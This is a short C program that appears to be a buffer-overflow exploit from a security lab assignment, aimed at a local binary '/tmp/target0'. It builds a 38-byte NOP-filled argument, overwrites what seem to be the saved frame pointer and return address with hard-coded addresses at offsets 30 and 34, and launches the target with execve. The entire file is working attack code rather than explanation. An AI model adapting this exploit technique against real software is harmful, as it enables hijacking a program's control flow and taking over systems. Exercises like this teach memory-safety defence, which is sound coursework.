#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[38];
  int i;
  for ( i= 0; i < 38; i++) { buffer[i] = 0x90; } // fil the buffer with NOPS
  long* tmp = (long*)(buffer + 30);
  *tmp = 0xbffff848;
  tmp = (long*)(buffer + 34);
  *tmp = 0x08048515;
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
